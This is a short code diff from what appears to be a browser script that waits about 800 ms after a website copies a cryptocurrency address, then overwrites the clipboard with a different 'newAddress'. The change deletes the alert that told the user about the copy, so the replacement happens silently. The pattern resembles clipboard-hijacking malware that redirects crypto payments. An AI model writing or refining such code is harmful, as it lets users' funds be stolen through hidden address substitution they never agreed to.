@@ -107,7 +107,7 @@
                         .writeText(newAddress)
                         .then(() => {
                             console.log(`[INFO] Custom copy for ${cryptoKey.toUpperCase()} address: ${newAddress}`);
-                            alert('Crypto address copied to clipboard!');
+
                         })
                         .catch((err) => console.error(`[ERROR] Failed to copy ${cryptoKey.toUpperCase()} address: ${err}`));
                 }, 800); // Wait for the website's copy behavior
